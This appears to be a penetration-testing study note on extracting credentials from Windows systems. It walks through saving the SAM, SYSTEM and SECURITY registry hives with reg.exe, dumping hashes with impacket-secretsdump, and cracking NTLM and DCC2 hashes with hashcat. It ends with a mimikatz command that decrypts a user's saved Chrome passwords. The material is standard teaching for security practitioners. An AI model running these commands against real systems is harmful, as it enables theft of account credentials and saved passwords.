# Extracting Password from Windows Systems

## SAM, SYSTEM, and SECURITY

With administrative access to a Windows system, we can attempt to quickly dump the files associated with the SAM database, transfer them to our attack host, and begin cracking the hashes offline.

Registry hives

| Registry Hive    | Description                                                                                                                                 |
|------------------|---------------------------------------------------------------------------------------------------------------------------------------------|
| HKLM\SAM         | Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.                |
| HKLM\SYSTEM      | Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.                        |
| HKLM\SECURITY    | Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more. |

To decrypt SAM, just use sam and system.

**Using reg.exe to copy registry hives**
````
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
````
**File Directory**
````
> C:\Windows\System32\config\SAM
> C:\Windows\System32\config\SECURITY
> C:\Windows\System32\config\SYSTEM
````
Copy to local machine
````
$ impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
$ impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL

$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
````

**DPAPI**
In addition to the DCC2 hashes, we previously saw that the machine and user keys for DPAPI were also dumped from hklm\security. The Data Protection Application Programming Interface, or DPAPI, is a set of APIs in Windows operating systems used to encrypt and decrypt data blobs on a per-user basis.

| Applications              | Use of DPAPI                                                                                   |
|---------------------------|-----------------------------------------------------------------------------------------------|
| Internet Explorer         | Password form auto-completion data (username and password for saved sites).                  |
| Google Chrome             | Password form auto-completion data (username and password for saved sites).                  |
| Outlook                   | Passwords for email accounts.                                                                 |
| Remote Desktop Connection | Saved credentials for connections to remote machines.                                        |
| Credential Manager        | Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.  |

DPAPI encrypted credentials can be decrypted manually with tools like Impacket's dpapi, mimikatz, or remotely with DonPAPI.

````
C:\Users\Public> mimikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
````
